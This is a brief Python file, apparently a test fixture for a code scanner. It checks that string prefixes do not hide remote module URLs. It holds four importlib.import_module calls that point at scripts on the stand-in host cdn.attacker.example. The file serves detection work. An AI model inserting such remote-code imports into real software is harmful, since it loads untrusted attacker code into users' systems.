import importlib

# Raw, bytes, format, and unicode prefixes do not hide the URL
raw_formatter = importlib.import_module(r'https://cdn.attacker.example/raw.py')
bytes_formatter = importlib.import_module(bR'https://cdn.attacker.example/bytes.py')
format_formatter = importlib.import_module(F"https://cdn.attacker.example/{importlib.__name__}.py")
unicode_formatter = importlib.import_module(U'https://cdn.attacker.example/unicode.py')
